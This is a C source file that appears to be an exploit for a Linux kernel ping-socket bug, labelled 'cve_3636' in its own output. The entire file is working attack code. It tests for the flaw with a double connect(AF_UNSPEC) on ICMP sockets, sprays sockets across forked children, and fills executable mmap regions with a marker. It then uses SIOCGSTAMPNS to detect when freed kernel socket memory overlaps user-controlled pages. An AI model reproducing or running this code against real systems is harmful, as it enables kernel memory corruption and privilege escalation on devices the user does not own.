#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/in.h>
#include <errno.h>
#include <sys/wait.h>


#define MAX_CHILD 1024
#define MAX_CHILD_SOCKS 65000
#define MAX_MMAP 1024
#define MAP_SIZE (4 * 1024 * 1024)

#define SIOCGSTAMPNS 0x8907

#define FILL_DATA 0x0db4da5f
#define NSEC_PER_SEC 1000000000

#define _PAGE_SIZE 0x1000

static int maximize_fd_limit(void)
{
	struct rlimit rlim;
	int ret;

	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	if (ret != 0) {
		return -1;
	}

	rlim.rlim_cur = rlim.rlim_max;
	setrlimit(RLIMIT_NOFILE, &rlim);

	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	if (ret != 0) {
		return -1;
	}

	return rlim.rlim_cur;
}

static int create_icmp_socket(void)
{
	struct sockaddr_in sa;
	int sock;
	int ret;

	memset(&sa, 0, sizeof sa);
	sa.sin_family = AF_INET;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
	if (sock == -1) {
		return -1;
	}

	ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
	if (ret != 0) {
		int result;

		result = errno;
		close(sock);
		errno = result;

		return -1;
	}

	return sock;
}


static int wait_for_child(int pipe_read)
{
	int i;
	char msg[16];
	int ret;


	ret = fcntl(pipe_read, F_SETFL, O_NONBLOCK);
	if (ret == -1) {
		perror("fcntl()");
		return -1;
	}

	for (i = 0; i < 50; i++) {
		ret = read(pipe_read, msg, 3);
		if (ret == -1 && errno == EAGAIN) {
			usleep(100000);
			continue;
		}

		break;
	}

	if (ret == -1 && errno == EAGAIN) {
		printf("read(): Timeout\n");
		return -1;
	}

	if (ret == -1) {
		perror("read()");
		return -1;
	}

	if (ret != 3) {
		printf("read(): Unexpected EOF\n");
		return -1;
	}


	return 0;
}



static int create_child(int *pipe_read, int max_fd)
{
	pid_t pid;
	int socks[max_fd];
	int i;
	int fds[2];

	int ret;

	if (pipe(fds) < 0){
		perror("pipe");
		return -1;
	}

	pid = fork();
	if (pid < 0)
		return -1;
	if (pid == 0) {
		close(fds[0]);

		for (i = 0; i < max_fd; i++) {
			socks[i] = create_icmp_socket();
			if (socks[i] < 0) {
				//printf("\ncan not create socket!\n");
				break;
			}
		}

		write(fds[1], "OK", 3);

		while (1) {
			sleep(6);
		}
		exit(0);

	}
	close(fds[1]);
	*pipe_read = fds[0];
	ret = wait_for_child(fds[0]);
	if (ret != 0)
		return -1;
	return pid;
}

static int setup_vul_socket(int sock)
{
	struct sockaddr_in sa;
	int ret;

	memset(&sa, 0, sizeof sa);
	sa.sin_family = AF_UNSPEC;

	ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
	if (ret != 0) {
		printf("connect(%d) #1: ret = %d\n", sock, ret);
		return -1;
	}

	ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
	if (ret != 0) {
		printf("connect%d() #2: ret = %d\n", sock, ret);
		return -1;
	}

	return 0;
}

static int close_child(pid_t pid)
{
	int timeout;
	int status;
	int success;
	int ret;

	success = 0;

	kill(pid,  SIGTERM);

	for (timeout = 50; timeout > 0; timeout--) {
		ret = waitpid(pid, &status, WNOHANG);
		if (ret != 0) {
			break;
		}

		if (WIFEXITED(status)) {
			success = 1;
			break;
		}

		usleep(100000);
	}

	kill(pid,  SIGKILL);

	ret = waitpid(pid, &status, 0);
	if (ret != 0) {
		return -1;
	}

	if (WIFEXITED(status)) {
		success = 1;
	}

	if (success) {
		return 0;
	}

	return -1;
}

static int fill_payload(unsigned long *addr, unsigned long size)
{
	int i;

	for (i = 0; i < (size / sizeof(unsigned long*)); i++) {
		addr[i] = FILL_DATA;
	}

	return 0;
}

static int get_sk(int sock)
{
	struct timespec tv;
	uint64_t value;
	uint32_t high, low;
	int ret;

	ret = ioctl(sock, SIOCGSTAMPNS, &tv);
	if (ret != 0) {
		return -1;
	}

	value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
	high = (unsigned)(value >> 32);
	low = (unsigned)value;

	if (high == FILL_DATA){
		return 1;
	}

	return 0;

}


int main()
{
	int *socks;
	unsigned long *address[MAX_MMAP];
	int pid[MAX_CHILD];
	int pipe_read[MAX_CHILD];

	void *addr;
	int max_fds;
	int i, num_socks, num_child;
	int j;
	int success, count;
	int fd;
	int vulnerable = 0;


	addr = mmap((void*)0x200000, _PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (addr == MAP_FAILED) {
		printf("map failed!\n");
		return -1;
	}
	memset((void*)0x200000, 0, _PAGE_SIZE);

	fd = create_icmp_socket();
	if (fd < 0) {
		printf("can not crate icmp socket!\n");
		return -1;
	}

	setup_vul_socket(fd);

	for (i = 0; i < _PAGE_SIZE / sizeof(int *); i++) {
		if (((unsigned int*)addr)[i] != 0) {
			vulnerable = 1;
			break;
		}
	}

	if (vulnerable == 0) {
		printf("cve_3636 not vulnerable!\n");
		return -1;
	}

	max_fds = maximize_fd_limit();
	printf("max_fds = %d\n", max_fds);
	socks = malloc(sizeof(int*) * (max_fds + 1));

	printf("create child to spray\n");
	num_child = 0;
	num_socks = 0;
	for (i = 0; i < MAX_CHILD; i++) {
		pid[i] = create_child(&pipe_read[i], max_fds);

		if (pid[i] == -1)
			break;

		printf(".");
		fflush(stdout);
		//printf("create vulnerable socket!\n");
		for (j = num_socks; j < max_fds; j++){
			socks[j] = create_icmp_socket();
			if (socks[j] == -1)
				break;
		}
		num_socks += j;
	}
	num_child = i;
	printf("\nchild num: %d\n", num_child);

	socks[num_socks] = -1;

	printf("vulnerable socket num: %d\n", num_socks);

	printf("now close child socket!\n");
	for (i = 0; i < num_child; i++) {
		close_child(pid[i]);
	}

	printf("setup vulnerable socket!\n");

	for (i = 0; i < num_socks; i++) {

		setup_vul_socket(socks[i]);
	}

	printf("sparying ...\n");
	success = 0;
	while (1) {

		count = 0;
		for (i = 0; i < MAX_MMAP; i++) {
			address[i] = mmap((void*)0, MAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
					MAP_SHARED|MAP_ANONYMOUS, -1, 0);
			if (address[i] == MAP_FAILED)
			{
				printf("map failed!\n");
				break;
			}
			fill_payload(address[i], MAP_SIZE);
			for (j = 0; socks[j] != -1; j++) {
				if (get_sk(socks[j]) > 0) {
					success = 1;
					printf("get it!\n");
					break;
				}
			}
			if (success)
				break;
		}
		count = i;

		if (success) {
			printf("free %ld bytes\n", MAP_SIZE * (count - 1));
			for (i = 0; i < count; i++) {
				munmap(address[i], MAP_SIZE);
			}

			break;
		}
	}

	printf("main end!\n");

	return 0;
}
